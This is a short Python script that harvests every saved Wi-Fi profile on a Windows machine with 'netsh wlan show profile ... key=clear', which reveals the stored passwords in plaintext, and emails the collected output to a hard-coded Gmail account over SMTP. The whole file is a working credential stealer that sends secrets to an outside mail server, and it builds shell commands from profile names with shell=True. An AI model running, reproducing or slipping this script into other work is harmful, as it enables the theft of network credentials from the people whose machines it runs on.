#!/usr/bin/env python

import subprocess, smtplib, re

###https://myaccount.google.com/lesssecureapps###
#Test-NetConnection -ComputerName smtp.gmail.com -Port 587

def send_mail(email, password, message):
    try:
        smtp_host = "smtp.gmail.com"
        smtp_port = 465
        server = smtplib.SMTP_SSL(smtp_host, smtp_port) #587, 465
        server.ehlo()
        #server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.close()
        #server.quit()

        print("Email sent!")
    except Exception as e:
        print(f"error: {e}")


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
#networks = str(networks)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode('utf-8'))
#print(networks_names_list)

result = ""
for network_name in networks_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    current_result = (current_result).decode('utf-8')
    result = result + current_result
    #print(result)
    
send_mail("your_email@gmail.com", "password", result)
